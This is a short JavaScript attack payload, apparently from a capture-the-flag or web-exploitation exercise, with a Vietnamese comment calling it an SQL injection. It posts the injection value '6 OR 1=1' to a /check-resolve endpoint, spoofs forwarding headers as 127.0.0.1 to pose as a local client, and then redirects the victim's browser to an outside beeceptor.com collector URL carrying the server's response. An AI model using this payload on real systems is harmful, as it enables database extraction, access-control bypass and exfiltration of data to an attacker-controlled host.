// Thay vì truyền id = 6, ta truyền payload SQL Injection
let formData = new URLSearchParams();
formData.append('id', '6 OR 1=1'); 

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
});